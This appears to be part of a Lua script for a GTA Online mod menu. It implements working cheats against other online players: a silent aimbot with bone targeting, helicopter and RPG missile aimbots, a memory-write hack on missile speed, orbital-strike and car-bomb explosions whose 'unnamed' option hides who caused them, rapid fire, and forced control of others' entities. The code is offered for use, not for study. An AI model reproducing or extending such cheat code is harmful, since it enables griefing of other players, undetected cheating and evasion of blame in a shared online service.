killAuraSettings:toggle_loop( "Draw peds in radius", {"kadrawpeds"}, "If toggled on, will draw the number of peds in the selected radius. Does not need KillAura to be enabled.", function ()
    local dcount = 1
    local dtable = {}
    local ourcoords = getEntityCoords(getLocalPed())
    --
    local pedPointers = entities.get_all_peds_as_pointers()
    for i = 1, #pedPointers do
        local v3 = entities.get_position(pedPointers[i])
        local vdist = MISC.GET_DISTANCE_BETWEEN_COORDS(ourcoords.x, ourcoords.y, ourcoords.z, v3.x, v3.y, v3.z, true)
        if vdist <= KA_Radius then
            dtable[dcount] = entities.pointer_to_handle(pedPointers[i])
            dcount = dcount + 1
        end
    end
    local cc = {r = 1.0, g = 1.0, b = 1.0, a = 1.0}
    directx.draw_text(0.0, 0.11, "Peds in radius of >> " .. KA_Radius .. " << " .. #dtable, ALIGN_TOP_LEFT, 0.5, cc, false)
end)

killAuraSettings:action("Spawn test peds", {}, "", function ()
    local hash = joaat("G_M_M_ChiGoon_02")
    local coords = getEntityCoords(getLocalPed())
    requestModel(hash)
    while not hasModelLoaded(hash) do wait() end
    PED.CREATE_PED(24, hash, coords.x, coords.y, coords.z, 0, true, false)
    noNeedModel(hash)
end)

killAuraSettings:action("Populate the map.", {}, "After killing a bit too many peds, you can re-populate the map with this neat button. How cool!", function ()
    MISC.POPULATE_NOW()
end)

AIM_Spine2 = false
AIM_Toe0 = false
AIM_Pelvis = false
AIM_Head = false
AIM_RHand = false
----
AIM_FOV = 1
AIM_Dist = 300
AIM_DMG = 30
----
LOS_CHECK = true
FOV_CHECK = true
--
AIM_WHITELIST = {}
AIM_NPCS = false
--
AIM_LEGITSILENT = true
AIM_HEADVEH = false

silentAim:toggle_loop("Silent Aimbot", {"silentaim", "saimbot"}, "A silent aimbot with bone selection.", function ()
    local ourped = getLocalPed()
    if PED.IS_PED_SHOOTING(ourped) then
        local ourc = getEntityCoords(ourped)
        local entTable = entities.get_all_peds_as_pointers()
        local inRange = {}
        local inCount = 1
        for i = 1, #entTable do
            local ed = entities.get_position(entTable[i])
            local entdist = distanceBetweenTwoCoords(ourc, ed)
            if entdist < AIM_Dist + 1 then
                local handle = entities.pointer_to_handle(entTable[i])
                if handle ~= getLocalPed() then
                    inRange[inCount] = handle
                    inCount = inCount + 1
                end
            end
        end
        local weaponHash = 177293209
        local bulletSpeed = 1000
        for i = 1, #inRange do
            local coord = getEntityCoords(inRange[i])
            if (PED.IS_PED_A_PLAYER(inRange[i]) and not AIM_NPCS) or (not PED.IS_PED_A_PLAYER(inRange[i]) and AIM_NPCS) then 
                if not PED.IS_PED_DEAD_OR_DYING(inRange[i], 1) then 
                    if (ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(ourped, inRange[i], 17) and LOS_CHECK == true) or (LOS_CHECK == false) then 
                        if (PED.IS_PED_FACING_PED(ourped, inRange[i], AIM_FOV) and FOV_CHECK == true) or (FOV_CHECK == false) then 
                            if not AIM_WHITELIST[NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(inRange[i])] then 
                                if distanceBetweenTwoCoords(coord, getEntityCoords(ourped)) < 401 and AIM_LEGITSILENT and ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(ourped, inRange[i], 17) then
                                    local playerID = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(inRange[i])
                                    local playerName = NETWORK.NETWORK_PLAYER_GET_NAME(playerID)
                                    local pveh = PED.GET_VEHICLE_PED_IS_IN(inRange[i], false)
                                    if SE_Notifications then
                                        util.toast("Targeted: " .. tostring(playerName) .. " with Legit Aim")
                                    end
                                    local forwardOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ourped, 0, 1, 2)
                                    if AIM_Head then
                                        local bonec = PED.GET_PED_BONE_COORDS(inRange[i], 12844, 0, 0, 0)
                                        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(forwardOffset.x, forwardOffset.y, forwardOffset.z, bonec.x, bonec.y, bonec.z, AIM_DMG, true, weaponHash, getLocalPed(), true, false, bulletSpeed, pveh, true)
                                    elseif not AIM_HEAD and AIM_HEADVEH and PED.IS_PED_IN_ANY_VEHICLE(inRange[i], false) then 
                                        util.toast("VehChecked " .. tostring(playerName))
                                        local bonec = PED.GET_PED_BONE_COORDS(inRange[i], 12844, 0, 0, 0)
                                        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(forwardOffset.x, forwardOffset.y, forwardOffset.z, bonec.x, bonec.y, bonec.z, AIM_DMG, true, weaponHash, getLocalPed(), true, false, bulletSpeed, pveh, true)
                                    end
                                    if AIM_Spine2 then
                                        local bonec = PED.GET_PED_BONE_COORDS(inRange[i], 24817, 0, 0, 0)
                                        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(forwardOffset.x, forwardOffset.y, forwardOffset.z, bonec.x, bonec.y, bonec.z, AIM_DMG, true, weaponHash, getLocalPed(), true, false, bulletSpeed, pveh, true)
                                    end
                                    if AIM_Pelvis then
                                        local bonec = PED.GET_PED_BONE_COORDS(inRange[i], 11816, 0, 0, 0)
                                        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(forwardOffset.x, forwardOffset.y, forwardOffset.z, bonec.x, bonec.y, bonec.z, AIM_DMG, true, weaponHash, getLocalPed(), true, false, bulletSpeed, pveh, true)
                                    end
                                    if AIM_Toe0 then
                                        local bonec = PED.GET_PED_BONE_COORDS(inRange[i], 20781, 0, 0, 0)
                                        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(forwardOffset.x, forwardOffset.y, forwardOffset.z, bonec.x, bonec.y, bonec.z, AIM_DMG, true, weaponHash, getLocalPed(), true, false, bulletSpeed, pveh, true)
                                    end
                                    if AIM_RHand then
                                        local bonec = PED.GET_PED_BONE_COORDS(inRange[i], 6286, 0, 0, 0)
                                        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(forwardOffset.x, forwardOffset.y, forwardOffset.z, bonec.x, bonec.y, bonec.z, AIM_DMG, true, weaponHash, getLocalPed(), true, false, bulletSpeed, pveh, true)
                                    end
                                else
                                    local playerID = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(inRange[i])
                                    local playerName = NETWORK.NETWORK_PLAYER_GET_NAME(playerID)
                                    local pveh = PED.GET_VEHICLE_PED_IS_IN(inRange[i], false)
                                    if SE_Notifications then
                                        util.toast("Targeted: " .. tostring(playerName))
                                    end
                                    local forwardOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(inRange[i], 0, 1, 1)
                                    if AIM_Head then
                                        local bonec = PED.GET_PED_BONE_COORDS(inRange[i], 12844, 0, 0, 0)
                                        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(forwardOffset.x, forwardOffset.y, forwardOffset.z, bonec.x, bonec.y, bonec.z, AIM_DMG, true, weaponHash, getLocalPed(), true, false, bulletSpeed, pveh, true)
                                    elseif not AIM_HEAD and AIM_HEADVEH and PED.IS_PED_IN_ANY_VEHICLE(inRange[i], false) then
                                        util.toast("VehChecked " .. tostring(playerName))
                                        local bonec = PED.GET_PED_BONE_COORDS(inRange[i], 12844, 0, 0, 0)
                                        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(forwardOffset.x, forwardOffset.y, forwardOffset.z, bonec.x, bonec.y, bonec.z, AIM_DMG, true, weaponHash, getLocalPed(), true, false, bulletSpeed, pveh, true)
                                    end
                                    if AIM_Spine2 then
                                        local bonec = PED.GET_PED_BONE_COORDS(inRange[i], 24817, 0, 0, 0)
                                        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(forwardOffset.x, forwardOffset.y, forwardOffset.z, bonec.x, bonec.y, bonec.z, AIM_DMG, true, weaponHash, getLocalPed(), true, false, bulletSpeed, pveh, true)
                                    end
                                    if AIM_Pelvis then
                                        local bonec = PED.GET_PED_BONE_COORDS(inRange[i], 11816, 0, 0, 0)
                                        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(forwardOffset.x, forwardOffset.y, forwardOffset.z, bonec.x, bonec.y, bonec.z, AIM_DMG, true, weaponHash, getLocalPed(), true, false, bulletSpeed, pveh, true)
                                    end
                                    if AIM_Toe0 then
                                        local bonec = PED.GET_PED_BONE_COORDS(inRange[i], 20781, 0, 0, 0)
                                        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(forwardOffset.x, forwardOffset.y, forwardOffset.z, bonec.x, bonec.y, bonec.z, AIM_DMG, true, weaponHash, getLocalPed(), true, false, bulletSpeed, pveh, true)
                                    end
                                    if AIM_RHand then
                                        local bonec = PED.GET_PED_BONE_COORDS(inRange[i], 6286, 0, 0, 0)
                                        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(forwardOffset.x, forwardOffset.y, forwardOffset.z, bonec.x, bonec.y, bonec.z, AIM_DMG, true, weaponHash, getLocalPed(), true, false, bulletSpeed, pveh, true)
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end)

weplist:toggle_loop("Aim at passengers", {}, "You can aim at passengers inside a vehicle.", function()
	local localPed = players.user_ped()
	if not PED.IS_PED_IN_ANY_VEHICLE(localPed, false) then
		return
	end
	local vehicle = PED.GET_VEHICLE_PED_IS_IN(localPed, false)
	for seat = -1, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(vehicle) - 1 do
		local ped = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, seat, false)
		if ENTITY.DOES_ENTITY_EXIST(ped) and ped ~= localPed and PED.IS_PED_A_PLAYER(ped) then
			local playerGroupHash = PED.GET_PED_RELATIONSHIP_GROUP_HASH(ped)
			local myGroupHash = PED.GET_PED_RELATIONSHIP_GROUP_HASH(localPed)
			PED.SET_RELATIONSHIP_BETWEEN_GROUPS(4, playerGroupHash, myGroupHash)
		end
	end
end)

local rapid_khanjali
rapid_khanjali = weplist:toggle_loop("Rapid fire Khanjali", {}, "", function()
    local player_veh = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
    if ENTITY.GET_ENTITY_MODEL(player_veh) == util.joaat("khanjali") then
        VEHICLE.SET_VEHICLE_MOD(player_veh, 10, math.random(-1, 0), false)
    else
        util.toast("get inside a khanjali.")
        menu.trigger_command(rapid_khanjali, "off")
    end
end)


silentAimSettings:slider("Silent Aimbot Damage", {"silentaimdamage", "silentdamage", "saimdamage"}, "The amount of damage Silent Aimbot does. Not accurate, sadly...", 1, 10000, 30, 10, function(value)
    AIM_DMG = value
end)

silentAimSettings:slider("Silent Aimbot Range", {"silentaimrange", "silentrange", "saimrange"}, "Silent Aimbot Range", 1, 10000, 300, 1, function (value)
    AIM_Dist = value
end)

silentAimSettings:slider("Silent Aimbot FOV", {"silentaimfov", "silentfov", "saimfov"}, "The FOV of which players can be targeted. (divided by 10)", 1, 2700, 1, 10, function (value)
    AIM_FOV = value / 10
end)

silentAimSettings:toggle("Vehicle Mode", {"silentaimvehicle", "silentvehice", "saveh"}, "Removes line-of-sight checks. Done to make silent aim work for vehicles. Please do note that the FOV is taken FROM THE VEHICLE, NOT FROM WHERE YOU ARE FACING.", function (on)
    if on then
        LOS_CHECK = false
    else
        LOS_CHECK = true
    end
end)

silentAimSettings:toggle("Legit Silent Aim", {"silentlegit"}, "If you have Line-of-Sight, attempts to shoot a bullet from you to the player. Doesn't always work if they're moving too fast.", function (on)
    if on then
        AIM_LEGITSILENT = true
    else
        AIM_LEGITSILENT = false
    end
end, true)

silentAimSettings:toggle("Vehicle-Head Check", {"silentcheckveh"}, "Will check if the selected player is in a vehicle. If they are in a vehicle, and HEAD isn't selected, will target their head automatically to increase chances of killing.", function (on)
    if on then
        AIM_HEADVEH = true
    else
        AIM_HEADVEH = false
    end
end)

silentAimSettings:toggle("Target ONLY NPCs", {"silentnpc"}, "Toggle this to ONLY silent aimbot NPCs. Toggle off for ONLY players.", function (on)
    if on then
        AIM_NPCS = true
    else
        AIM_NPCS = false
    end
end)


silentAimSettings:toggle("Silent Aimbot Head", {"silentaimhead", "silenthead", "saimhead"}, "Makes the aimbot target the head. Probably doesn't look legitimate, but ok.", function(on)
    if on then
        AIM_Head = true
    else
        AIM_Head = false
    end
end)

silentAimSettings:toggle("Silent Aimbot Body (Spine2)", {"silentaimspine2", "silentspine2", "saimspine2"}, "Makes the aimbot target the body, also known as spine2.", function(on)
    if on then
        AIM_Spine2 = true
    else
        AIM_Spine2 = false
    end
end)

silentAimSettings:toggle("Silent Aimbot Pelvis", {"silentaimpelvis", "silentpelvis", "saimpelvis"}, "Makes the aimbot target the pelvis.", function (on)
    if on then
        AIM_Pelvis = true
    else
        AIM_Pelvis = false
    end
end)

silentAimSettings:toggle("Silent Aimbot Toe (Toe0)", {"silentaimtoe", "silenttoe", "saimtoe"}, "Makes the aimbot target the toe, otherwise known as toe0", function (on)
    if on then
        AIM_Toe0 = true
    else
        AIM_Toe0 = false
    end
end)

silentAimSettings:toggle("Silent Aimbot Hand (R_HAND)", {"silentaimhand", "silenthand", "saimhand"}, "Makes the aimbot target the hand, otherwise known as R_Hand", function (on)
    if on then
        AIM_RHand = true
    else
        AIM_RHand = false
    end
end)

local function setVehicleMissileSpeed(value)
    local offsets = {0x10D8, 0x70, 0x60, 0x58}
    local addr = entities.handle_to_pointer(PLAYER.PLAYER_PED_ID())
    for i = 1, (#offsets - 1) do
        if addr == 0 then
            return -1.0
        end
        addr = memory.read_long(addr + offsets[i])
    end
    addr = addr + offsets[#offsets]
    
    if addr == 0 then
        return -1.0
    else
        memory.write_float(addr, value)
    end
end

function GetVehicleMissileSpeed()
    local offsets = {0x10D8, 0x70, 0x60, 0x58}
    local addr = entities.handle_to_pointer(PLAYER.PLAYER_PED_ID())
    for i = 1, (#offsets - 1) do
        if addr == 0 then
            return -1.0
        end
        addr = memory.read_long(addr + offsets[i])
    end
    addr = addr + offsets[#offsets]
    
    if addr == 0 then
        return -1.0
    else
        return memory.read_float(addr)
    end
end

VEH_MISSILE_SPEED = 10000

vehaim:toggle_loop("Helicopter Aimbot", {}, "Makes the heli aim at the closest player. Combine this with 'silent aimbot' for it to look like you're super good :)", function ()
    local p = getClosestPlayerWithRange_Whitelist(200)
    local localped = getLocalPed()
    local localCoords = getEntityCoords(localped)
    if p ~= nil and not PED.IS_PED_DEAD_OR_DYING(p) and ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(localped, p, 17) and not AIM_WHITELIST[NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(p)] and (not players.is_in_interior(NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(p))) and (not players.is_godmode(NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(p))) then
        if PED.IS_PED_IN_ANY_VEHICLE(localped) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
            if VEHICLE.GET_VEHICLE_CLASS(veh) == 15 or VEHICLE.GET_VEHICLE_CLASS(veh) == 16 then 
                local pcoords = PED.GET_PED_BONE_COORDS(p, 24817, 0, 0, 0)
                local look = util.v3_look_at(localCoords, pcoords)
                ENTITY.SET_ENTITY_ROTATION(veh, look.x, look.y, look.z, 1, true)
            end
        end
    end
end)

vehaim:action("Modify Missile Speed", {}, "Thank you so much Nowiry for this.", function ()
    local localped = getLocalPed()
    if PED.IS_PED_IN_ANY_VEHICLE(localped) then
        local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
        if VEHICLE.GET_VEHICLE_CLASS(veh) == 15 or VEHICLE.GET_VEHICLE_CLASS(veh) == 16 then
            setVehicleMissileSpeed(VEH_MISSILE_SPEED)
        end
    end
end)

vehaim:slider("Set missile speed", {"vehmissilespeed"}, "Sets the speed of your missiles.", 1, 2147483647, 10000, 100, function (value)
    VEH_MISSILE_SPEED = value
end)

MISL_AIM = false
MISL_RAD = 300
MISL_SPD = 100
MISL_LOS = true
MISL_CAM = false


ATTACH_CAM_TO_ENTITY_WITH_FIXED_DIRECTION = function (cam, entity, xRot, yRot, zRot, xOffset, yOffset, zOffset, isRelative)
    native_invoker.begin_call()
    native_invoker.push_arg_int(cam)
    native_invoker.push_arg_int(entity)
    native_invoker.push_arg_float(xRot); native_invoker.push_arg_float(yRot); native_invoker.push_arg_float(zRot)
    native_invoker.push_arg_float(xOffset); native_invoker.push_arg_float(yOffset); native_invoker.push_arg_float(zOffset)
    native_invoker.push_arg_bool(isRelative)
    native_invoker.end_call("202A5ED9CE01D6E7")
end


rpgaim:toggle("RPG Aimbot / Most Vehicles", {"rpgaim"}, "You heard me. Only the REGULAR RPG, not the homing one. Works on vehicles as well, such as Lazer or Buzzard. No guarantees, though!", function (on)
    if on then
        MISL_AIM = true
        local rockethash = util.joaat("w_lr_rpg_rocket")
        util.create_thread(function()
            while MISL_AIM do
                local localped = getLocalPed()
                local localcoords = getEntityCoords(getLocalPed())
                RRocket = OBJECT.GET_CLOSEST_OBJECT_OF_TYPE(localcoords.x, localcoords.y, localcoords.z, 10, rockethash, false, true, true, true)
                local p = getClosestPlayerWithRange_Whitelist(MISL_RAD)
                local ppcoords = getEntityCoords(p)
                if (RRocket ~= 0) and (p ~= nil) and (not PED.IS_PED_DEAD_OR_DYING(p)) and (not AIM_WHITELIST[NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(p)]) and (PED.IS_PED_SHOOTING(localped)) and (not players.is_in_interior(NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(p))) and (ppcoords.z > 1) then
                    if (ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(localped, p, 17) and MISL_LOS) or not MISL_LOS or MISL_AIR then
                        if SE_Notifications then
                            util.toast("Precusors done!")
                        end
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(RRocket)
                        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(RRocket) then
                            for i = 1, 10 do
                                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(RRocket)
                            end
                        else
                            if SE_Notifications then
                                util.toast("has control")
                            end
                        end
                        local aircount = 1
                        Missile_Camera = 0
                        while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED("core") do
                            STREAMING.REQUEST_NAMED_PTFX_ASSET("core")
                            wait()
                        end
                        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                        GRAPHICS.START_PARTICLE_FX_NON_LOOPED_ON_ENTITY("exp_grd_rpg_lod", RRocket, 0, 0, 0, 0, 0, 0, 2, false, false, false)
                        while ENTITY.DOES_ENTITY_EXIST(RRocket) do
                            if SE_Notifications then
                                util.toast("rocket exists")
                            end
                            local pcoords = PED.GET_PED_BONE_COORDS(p, 20781, 0, 0, 0)
                            local lc = getEntityCoords(RRocket)
                            local look = util.v3_look_at(lc, pcoords)
                            local dir = util.rot_to_dir(look)
                            local fakeOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(RRocket, 0, 0.5, 0)
                            ENTITY.SET_ENTITY_COORDS(FakeRocket, fakeOffset.x, fakeOffset.y, fakeOffset.z, false, false, false, false)
                            ENTITY.SET_ENTITY_ROTATION(FakeRocket, look.x, look.y, look.z, 2, true)
                            STREAMING.REQUEST_NAMED_PTFX_ASSET("core")
                            while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED("core") do
                                STREAMING.REQUEST_NAMED_PTFX_ASSET("core")
                                wait()
                            end
                            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("exp_grd_rpg_lod", lc.x, lc.y, lc.z, 0, 0, 0, 0.4, false, false, false, true)

                            if aircount < 2 and MISL_AIR then
                                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(RRocket, 1, 0, 0, 99990000, true, false, true, true)
                                aircount = aircount + 1
                                wait(1100)
                            end
                            local lookCountD = 0
                            if MISL_AIR then
                                if MISL_CAM then
                                    if not CAM.DOES_CAM_EXIST(Missile_Camera) then
                                        if SE_Notifications then
                                            util.toast("camera setup")
                                        end
                                        CAM.DESTROY_ALL_CAMS(true)
                                        Missile_Camera = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", true)
                                        CAM.SET_CAM_ACTIVE(Missile_Camera, true)
                                        CAM.RENDER_SCRIPT_CAMS(true, false, 0, true, true, 0)
                                    end
                                end
                                local distx = math.abs(lc.x - pcoords.x)
                                local disty = math.abs(lc.y - pcoords.y)
                                local distz = math.abs(lc.z - pcoords.z)
                                if MISL_CAM then
                                    local ddisst = SYSTEM.VDIST(pcoords.x, pcoords.y, pcoords.z, lc.x, lc.y, lc.z)
                                    if ddisst > 50 then
                                        local look2 = util.v3_look_at(CAM.GET_CAM_COORD(Missile_Camera), lc)
                                        local backoffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(RRocket, 10, 10, -2)
                                        CAM.SET_CAM_COORD(Missile_Camera, backoffset.x, backoffset.y, backoffset.z)
                                        if lookCountD < 1 then
                                            CAM.SET_CAM_ROT(Missile_Camera, look2.x, look2.y, look2.z, 2)
                                            lookCountD = lookCountD + 1
                                        end
                                    else
                                        local look2 = util.v3_look_at(CAM.GET_CAM_COORD(Missile_Camera), pcoords)
                                        CAM.SET_CAM_ROT(Missile_Camera, look2.x, look2.y, look2.z, 2)
                                    end
                                end
                                ENTITY.SET_ENTITY_ROTATION(RRocket, look.x, look.y, look.z, 2, true)
                                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(RRocket, 1, dir.x * MISL_SPD * distx, dir.y * MISL_SPD * disty, dir.z * MISL_SPD * distz, true, false, true, true)
                                wait()
                            else
                                ENTITY.SET_ENTITY_ROTATION(RRocket, look.x, look.y, look.z, 2, true)
                                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(RRocket, 1, dir.x * MISL_SPD, dir.y * MISL_SPD, dir.z * MISL_SPD, true, false, true, true)
                                wait()
                            end
                        end

                        if MISL_CAM then
                            wait(2000)
                            if SE_Notifications then
                                util.toast("cam remove")
                            end
                            CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
                            if CAM.IS_CAM_ACTIVE(Missile_Camera) then
                                CAM.SET_CAM_ACTIVE(Missile_Camera, false)
                            end
                            CAM.DESTROY_CAM(Missile_Camera, true)
                        end
                    end
                end
                wait()
            end
        end)
    else
        MISL_AIM = false
    end
end)

MISL_AIR = false


rpgsettings:toggle("Enable Javelin Mode", {"rpgjavelin"}, "Makes the rocket go very up high and kill the closest player to you :) | Advised: Combine 'RPG LOS Remove' for you to fire at targets that you do not see.", function (on)
    if on then
        MISL_AIR = true
    else
        MISL_AIR = false
    end
end)

rpgsettings:slider("RPG Aimbot Radius", {"msl_frc_rad"}, "Range for missile aimbot, e.g. how far the person can be away.", 1, 10000, 300, 10, function (value)
    MISL_RAD = value
end)

rpgsettings:slider("RPG Speed Multiplier", {"msl_spd_mult"}, "Multiplier for speed. Default is 100, it's good.", 1, 10000, 100, 100, function (value)
    MISL_SPD = value
end)

rpgsettings:toggle("RPG LOS Remove", {}, "Removes line-of-sight checks. Do not turn this on unless you know what you're doing.", function (on)
    if on then
        MISL_LOS = false
    else
        MISL_LOS = true
    end
end)

rpgsettings:toggle("RPG Dashcam™", {"rpgcamera"}, "Now with a dashcam, you can finally find out where the fuck your rocket goes if you're using javelin mode.", function (on)
    if on then
        MISL_CAM = true
    else
        MISL_CAM = false
    end
end)

----------------------------------------------------------------------------------------------------

ORB_Sneaky = false

orbway:action("Orbital Strike Waypoint", {"orbway", "orbwp"}, "Orbital Cannons your selected Waypoint.", function ()
    local wpos = get_waypoint_pos2()
    if SE_Notifications then
        util.toast("Selected Waypoint Coordinates: " .. wpos.x .. " " .. wpos.y .. " " .. wpos.z)
    end
    if ORB_Sneaky then
        for a = 1, 30 do
            SE_add_explosion(wpos.x, wpos.y, wpos.z + 30 - a, 29, 10, true, false, 1, false)
            SE_add_explosion(wpos.x, wpos.y, wpos.z + 30 - a, 59, 10, true, false, 1, false)
            wait(30)
        end
    else
        for i = 1, 30 do
            SE_add_owned_explosion(getLocalPed(), wpos.x, wpos.y, wpos.z + 30 - i, 29, 10, true, false, 1)
            SE_add_owned_explosion(getLocalPed(), wpos.x, wpos.y, wpos.z + 30 - i, 59, 10, true, false, 1)
            wait(30)
        end
    end
end)

orbway:toggle("Unnamed Explosion", {}, "Makes the orbital not blamed on you.", function (on)
    if on then
        ORB_Sneaky = true
    else
        ORB_Sneaky = false
    end
end)

----------------------------------------------------------------------------------------------------

CAR_S_sneaky = false
CAR_S_BLACKLIST = {}

carsuic:toggle_loop("Auto Car-Suicide", {"carexplode"}, "Automatically explodes your car when you are next to a player.", function()
    local ourped = getLocalPed()
    if PED.IS_PED_IN_ANY_VEHICLE(ourped, false) then
        local pedTable = entities.get_all_peds_as_pointers()
        local ourCoords = getEntityCoords(ourped)
        for i = 1, #pedTable do
            local handle = entities.pointer_to_handle(pedTable[i])
            if PED.IS_PED_A_PLAYER(handle) then
                local playerID = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(handle)
                local v3 = entities.get_position(pedTable[i])
                local dist = distanceBetweenTwoCoords(ourCoords, v3)
                if dist < 5 and handle ~= getLocalPed() and not CAR_S_BLACKLIST[playerID] then
                    if CAR_S_sneaky then
                        SE_add_explosion(ourCoords.x, ourCoords.y, ourCoords.z, 2, 10, true, false, 0.1, false)
                        SE_add_explosion(ourCoords.x - 4, ourCoords.y, ourCoords.z, 2, 20, false, true, 0.1, false)
                        SE_add_explosion(ourCoords.x + 4, ourCoords.y, ourCoords.z, 2, 20, false, true, 0.1, false)
                        SE_add_explosion(ourCoords.x, ourCoords.y - 4, ourCoords.z, 2, 20, false, true, 0.1, false)
                        SE_add_explosion(ourCoords.x, ourCoords.y + 4, ourCoords.z, 2, 20, false, true, 0.1, false)
                    else
                        SE_add_owned_explosion(ourped, ourCoords.x, ourCoords.y, ourCoords.z, 2, 10, true, false, 0.1)
                        SE_add_owned_explosion(ourped, ourCoords.x - 4, ourCoords.y, ourCoords.z, 2, 20, false, true, 0.1)
                        SE_add_owned_explosion(ourped, ourCoords.x + 4, ourCoords.y, ourCoords.z, 2, 20, false, true, 0.1)
                        SE_add_owned_explosion(ourped, ourCoords.x, ourCoords.y - 4, ourCoords.z, 2, 20, false, true, 0.1)
                        SE_add_owned_explosion(ourped, ourCoords.x, ourCoords.y + 4, ourCoords.z, 2, 20, false, true, 0.1)
                    end
                end
            end
        end
    end
end)

carsuic:toggle("Car Suicide Unnamed", {"carexplodesneaky"}, "Makes the explosion of the car bomb not blamed on you.", function(on)
    if on then
        CAR_S_sneaky = true
    else
        CAR_S_sneaky = false
    end
end)

----------------------------------------------------------------------------------------------------


LegitRapidFire = false
LegitRapidMS = 100

legitrapid:toggle("Legit Rapid Fire (fast-switch)", {"legitrapidfire"}, "Quickly switches to grenades and back to your weapon after you shot something. Useful with Sniper, RPG, Grenade Launcher.", function(on)
    local localped = getLocalPed()
    if on then
        LegitRapidFire = true
        util.create_thread(function ()
            while LegitRapidFire do
                if PED.IS_PED_SHOOTING(localped) then
                    local currentWpMem = memory.alloc()
                    local junk = WEAPON.GET_CURRENT_PED_WEAPON(localped, currentWpMem, 1)
                    local currentWP = memory.read_int(currentWpMem)
                    memory.free(currentWpMem)
                    WEAPON.SET_CURRENT_PED_WEAPON(localped, 2481070269, true) 
                    wait(LegitRapidMS)
                    WEAPON.SET_CURRENT_PED_WEAPON(localped, currentWP, true)
                end
                wait()
            end
        end)
    else
        LegitRapidFire = false
    end
end)

legitrapid:slider("Legit Rapid Fire Delay (ms)", {"legitrapiddelay"}, "The delay that it takes to switch to grenade and back to the weapon.", 1, 1000, 100, 50, function (value)
    LegitRapidMS = value
end)

-----------------------------------------------------------------------------------------------------------------------------------

local debugFeats = menu.list(menuroot, "Debug", {}, "")

menuAction(debugFeats, "Get V3 Coords", {"printcoords"}, "Toasts your coordinates.", function()
    local playerCoords = getEntityCoords(getPlayerPed(players.user()), true)
        notification.normal("X:" .. tostring(playerCoords['x']) .. "\nY:".. tostring(playerCoords['y']) .. "\nZ:" ..tostring(playerCoords['z']))
        toast("X:" .. tostring(playerCoords['x']) .. "\nY:".. tostring(playerCoords['y']) .. "\nZ:" ..tostring(playerCoords['z']))
end)

menuToggleLoop(debugFeats, "Request Control?", {}, "", function ()
    ::start::
    local localPed = getLocalPed()
    if PED.IS_PED_SHOOTING(localPed) then
        local contr = memory.alloc(4)
        local isEntFound = PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), contr)
        if isEntFound then
            local ent = memory.read_int(contr)
            local wascoord = getEntityCoords(ent)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ent, 1000, 1000, 1000, true, true, true)
            wait(100)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ent, wascoord.x, wascoord.y, wascoord.z, true, true, true)
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
                for i = 1, 20, 1 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
                    wait(100) 
                end
            end
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then util.toast("Waited 2 seconds, couldn't get control!") goto start end
            util.toast("Has control!")
        end
        memory.free(contr)
    end
end)


